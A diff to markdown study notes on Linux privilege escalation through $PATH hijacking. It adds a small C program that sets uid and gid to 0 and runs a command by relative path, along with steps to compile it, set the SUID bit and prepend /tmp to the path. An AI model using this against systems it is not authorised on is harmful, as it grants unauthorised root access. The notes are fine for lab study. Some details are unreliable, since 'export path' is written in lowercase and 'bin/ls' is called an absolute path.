@@ -50,6 +50,8 @@ Complie this text as a shared extension
 **Allowed binary** *= What commands you have access to in sudo -l*
 
 ## $Path
+Use **echo $PATH** 
+
 **$PATH** escalation occurs when a high privilege executable like a SUID binary calls a system command e.g ls, cat, echo using a relative path rather than an absolute path e.g bin/ls
 
 **find / -writable 2>/dev/null** find writeable files. 
@@ -57,8 +59,20 @@ Complie this text as a shared extension
 **find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u** to hide running related proccesses. 
 
 **which**  to check the path of the command.
+**Path.c**
+```
+#include<unistd.h>
+void main()
+{ setuid(0);
+  setgid(0);
+  system("exploit");
+}
+```
+* gcc path.c -o path -w
+* chmod u+s path
+* export path=/tmp:$PATH
+* exploit
 
-Use **echo $PATH** 
 
 
 
